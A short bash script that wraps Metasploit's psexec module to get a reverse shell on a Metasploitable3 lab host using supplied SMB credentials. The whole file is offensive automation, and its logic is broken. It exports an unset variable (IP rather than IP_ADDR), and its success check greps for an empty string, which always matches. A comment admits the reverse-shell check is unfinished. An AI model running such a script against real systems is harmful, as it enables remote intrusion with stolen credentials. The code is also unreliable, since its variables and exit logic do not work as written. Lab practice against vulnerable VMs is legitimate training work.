#!/bin/bash

#PSexec Windows exploit for Metasploitable3

#Parameters
#Script ip_address
#Script username
#Script password

#Make Sure The Correct Arguments are passed
if [ $# -ne 3 ]
then
	echo "Usage: $0 <host_ip> <smb_user> <smb_pass>"
	exit 1
fi

#Save all the arguments in variables
IP_ADDR=$1
USER=$2
PASS=$3

#Check for the required utilities
#Check if the metasploit framework is available
if ! command -v msfconsole &> /dev/null; then
    echo "This module requires msfconsole to be installed."
    exit 1
fi


#Export the variables so they can be taken in by Metasploit
export IP
export USER
export PASS


#Run the RC Script
command msfconsole -r psexec.rc $1 &> ./log 

#Check if the script contains a successful exploit
if grep -q "" log; #Need to find way to check reverse shell
then 
	exit 1
else 
	exit 0
fi
